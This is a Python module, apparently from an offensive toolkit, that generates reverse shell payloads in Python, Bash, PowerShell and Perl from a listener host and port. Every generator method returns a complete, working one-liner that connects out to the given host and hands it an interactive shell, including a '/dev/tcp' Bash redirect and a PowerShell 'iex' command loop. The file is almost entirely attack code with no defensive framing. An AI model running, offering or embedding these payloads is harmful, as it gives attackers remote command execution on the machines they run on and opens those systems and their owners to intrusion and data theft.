"""Reverse Shell Payload Generator"""

import base64

class PayloadGenerator:
    """Generate reverse shell payloads"""
    
    def __init__(self):
        self.name = 'reverse_shell'
        self.description = 'Generate reverse shell in multiple formats'
        self.formats = ['python', 'bash', 'powershell', 'perl']
    
    def generate(self, options):
        """Generate reverse shell payload"""
        lhost = options.get('LHOST')
        lport = options.get('LPORT')
        format_type = options.get('FORMAT', 'python')
        
        if format_type == 'python':
            payload = self._python_shell(lhost, lport)
        elif format_type == 'bash':
            payload = self._bash_shell(lhost, lport)
        elif format_type == 'powershell':
            payload = self._powershell_shell(lhost, lport)
        elif format_type == 'perl':
            payload = self._perl_shell(lhost, lport)
        else:
            raise ValueError(f"Unknown format: {format_type}")
        
        return {
            'payload': payload,
            'format': format_type,
            'lhost': lhost,
            'lport': lport,
            'size': len(payload)
        }
    
    def _python_shell(self, lhost, lport):
        return f"""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])"""
    
    def _bash_shell(self, lhost, lport):
        return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    
    def _powershell_shell(self, lhost, lport):
        ps_cmd = f"$client = New-Object System.Net.Sockets.TcpClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{{0}};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        return ps_cmd
    
    def _perl_shell(self, lhost, lport):
        return f"""perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""